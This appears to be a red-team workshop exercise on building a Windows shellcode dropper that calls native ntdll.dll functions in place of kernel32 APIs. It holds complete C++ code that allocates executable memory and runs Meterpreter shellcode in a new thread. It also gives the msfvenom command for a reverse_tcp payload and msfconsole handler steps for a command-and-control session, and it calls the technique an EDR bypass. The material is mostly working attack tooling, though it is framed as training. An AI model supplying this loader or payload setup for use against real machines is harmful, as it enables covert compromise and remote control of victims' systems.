## Introduction: Exercise 4 Medium_Level_API_Dropper
In this exercise, we will make the first modification to the reference dropper and replace the Windows APIs (Kernel32.dll) with native APIs (Ntdll.dll).
We create a **medium-level API shellcode dropper** in short **MLA-dropper** based on native APIs. 
![medium_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235372969-4d24ddec-7ee5-443e-966a-24b3d70dc3a8.png)



## Workshop tasks: Exercise 4 Medium_Level_API_Dropper
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the MLA Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ MLA Dropper POC. 
3. Compile the MLA Dropper as release or debug x64. 
4. Create and run a staged x64 meterpreter listener with msfconsole.
5. Run your compiled .exe and verify that a stable command and control channel opens. 
6. Use the Visual Studio dumpbin to verify that the Windows APIs are no longer being imported by kernel32.dll. 
7. Use the API Monitor tool to verify that there are no more transitions from Windows APIs to Native APIs related to the MLA dropper. 
8. Use x64 dbg and check where the syscall execution of each used native API comes from ? Module? Location? 


## Visual Studio
Same procedure as in the high-level API dropper exercise, take a look to follow the necessary steps.
We replace all Windows APIs with the corresponding native APIs and create our MLA dropper.
- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx
- NtWaitForSingleObject

The code works as follows. Unlike the Windows APIs, most of the Native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. To use the Native APIs in the Medium Level Dropper, we must manually define the function pointers for the Native API functions in the MLA dropper code.
<p align="center">
<img width="726" alt="image" src="https://user-images.githubusercontent.com/50073731/235373833-787137bf-e79b-41a3-b0cb-a83a29c541be.png">
</p>

Shellcode declaration same as before in the high-level API dropper.
<p align="center">
<img width="608" alt="image" src="https://user-images.githubusercontent.com/50073731/235367184-71a8dbb0-036b-4cc1-93d2-28ef1abfd9ef.png">
</p>  

We need to manually load the required native APIs from ntdll.dll.
<p align="center">
<img width="790" alt="image" src="https://user-images.githubusercontent.com/50073731/235374135-eeda7d5a-5a95-40bf-8a58-43e65c90d9c6.png">
</p>

For memory allocation, we replace the Windows API VirtualAlloc with the native API NtAllocateVirtualMemory.
<p align="center">
<img width="741" alt="image" src="https://user-images.githubusercontent.com/50073731/235373720-c004340c-4132-41b7-9494-1d7f0aaea053.png">
</p>

For shellcode copying, we replace the Windows API WriteProcessMemory with the native API NtWriteVirtualMemory.
<p align="center">
<img width="591" alt="image" src="https://user-images.githubusercontent.com/50073731/235374052-448e1e9d-caf5-4d80-972f-fd0ef70feb95.png">
</p>

For shellcode execution, we replace the Windows API CreateThread with the native API NtCreateThreadEx.
<p align="center">
<img width="568" alt="image" src="https://user-images.githubusercontent.com/50073731/235374248-fecf50c3-72b9-4f2b-95b3-d0aa86378a79.png">
</p>

And finally we have to replace the Windows API WaitForSingleObject with the native API NtWaitForSingleObject
<p align="center">
<img width="603" alt="image" src="https://user-images.githubusercontent.com/50073731/235374361-df94b5cc-1307-4229-9d54-c83bafe2daac.png">
</p>

Here is the complete code and you can copy this code to your medium level API POC.

```
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define function pointers for native API functions
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* PNTWRITEVIRTUALMEMORY)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* PNTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* PNTWAITFORSINGLEOBJECT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS(NTAPI* PNTCLOSE)(HANDLE);
typedef NTSTATUS(NTAPI* PNTFREEVIRTUALMEMORY)(HANDLE, PVOID*, PSIZE_T, ULONG);


int main() {

    // Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83...";

    // Load native API functions from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    PNTWRITEVIRTUALMEMORY NtWriteVirtualMemory = (PNTWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    PNTCREATETHREADEX NtCreateThreadEx = (PNTCREATETHREADEX)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    PNTWAITFORSINGLEOBJECT NtWaitForSingleObject = (PNTWAITFORSINGLEOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWaitForSingleObject");
    PNTCLOSE NtClose = (PNTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory = (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");


    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 as the main function exit code
    return 0;

}
```


## Meterpreter Shellcode
In this step, we will create our shellcode for the high-level API dropper poc with msfvenom in Kali Linux. To do this, we use the following command and 
create x64 staged meterpreter shellcode.
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the POC by replacing the placeholder at the unsigned char, and the POC can be compiled as a x64 release.
<p align="center">
<img width="596" alt="image" src="https://user-images.githubusercontent.com/50073731/235358159-c43053aa-9a35-4b4e-b627-001b112e6324.png">
</p>


## MSF-Listener
Before we test the functionality of our high-level API dropper, we need to create a listener within msfconsole.

**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>

Once the listener has been successfully started, you can run your compiled high_level_dropper.exe. If all goes well, you should see an incoming command and control session 

<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>



## MLA-Dropper analysis: Dumpbin tool
The Visual Studio Dumpbin tool can be used to check which Windows APIs are imported via Kernel32.dll. The following command can be used to check the imports.
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
Compared to the high level dropper, you can observe that the medium level dropper no longer imports the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject from kernel32.dll.
<p align="center">
<img width="729" alt="image" src="https://user-images.githubusercontent.com/50073731/235374656-117e0468-cd4d-4832-afb7-599cf94d2f1b.png">
</p>

## MLA-Dropper analysis: API-Monitor
Compared to the high-level dropper, you can see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject no longer pass to the four corresponding native APIs. For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions. We filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

If everything was done correctly, you should no longer transitions from the Windows APIs to the native APIs we used in our medium-level Dropper POC.
Instead we directly access the native APIs in ntdll.dll
<p align="center">
<img width="522" alt="image" src="https://user-images.githubusercontent.com/50073731/235374864-c7e90dd6-82c6-49d1-a90c-b80a531416b3.png">
</p>

## HLA-Dropper analysis: x64dbg 
Using x64dbg I check from which region of the PE structure of the High Level API dropper the system call for the Native API NtAllocateVirtualMemory is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of Ntdll.dll. This investigation is very important because later in the article I expect a different result with the low level POC and want to match it.
![image](https://user-images.githubusercontent.com/50073731/235368598-ad159117-abb5-4b0d-8b52-bea2a162b565.png)


## Summary: Medium-level API Dropper
- Made transition from high to medium level or from Windows APIs to Native APIs
- But still no direct use of system calls
- Syscall execution over medium_level_dropper.exe -> ntdll.dll -> syscall
- Dropper imports no longer Windows APIs from kernel32.dll...
- In case of EDR would only hook kernel32.dll -> EDR bypassed 